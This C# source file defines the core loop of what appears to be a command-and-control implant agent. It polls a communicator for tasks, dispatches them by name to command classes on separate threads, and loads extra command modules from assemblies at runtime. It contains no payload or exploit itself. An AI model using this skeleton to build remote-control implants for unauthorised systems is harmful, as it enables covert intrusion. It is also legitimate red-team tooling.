using Agent.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class Agent
    {
        private CommModule _communicator;
        private AgentMetadata _metadata;

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        public void LoadCoreAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

            this._metadata.AvailableCommands = this._commands.Select(c => c.Name).OrderBy(c => c).ToArray();
            this._communicator.Init(this._metadata);
        }

        public int LoadCommands(Assembly module)
        {
            int count = 0;
            foreach (var type in module.GetTypes())
            {

                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    if (!_commands.Any(c => c.Name == instance.Name))
                    {
                        _commands.Add(instance);
                        count++;
                    }
                }
            }

            this._metadata.AvailableCommands = this._commands.Select(c => c.Name).OrderBy(c => c).ToArray();
            this._communicator.Init(this._metadata);
            return count;
        }

        public Agent(AgentMetadata metadata, CommModule comm)
        {
            _metadata = metadata;
            _communicator = comm;

            LoadCoreAgentCommands();
        }

        public void Start()
        {
            //_communicator.Init(this._metadata);
            //_communicator.Start();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_communicator.ReceieveData(out var tasks))
                {
                    
                    HandleTask(tasks);
                }
                Thread.Sleep(100);
            }
        }


        public void Stop()
        {
            this._tokenSource.Cancel();
        }

        public void HandleTask(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                Thread t = new Thread(this.StartHandleTask);
                t.Start(task);
            }
        }

        public void StartHandleTask(object task)
        {
            this.HandleTask(task as AgentTask);
        }

        public void HandleTask(AgentTask task)
        {
            var command = this._commands.FirstOrDefault(c => c.Name == task.Command);

            AgentTaskResult result = null;

            if (command is null)
            {
                result = new AgentTaskResult()
                {
                    Id = task.Id,
                    Result = $"Agent has no {task.Command} command registered!",
                    Status = AgentResultStatus.Completed,
                };
                this._communicator.SendResult(result);
            }
            else
                command.Execute(task, this, this._communicator);
        }

        //private void SendTaskResult(AgentTaskResult result)
        //{
        //    this._communicator.SendData(result);
        //}

    }
}
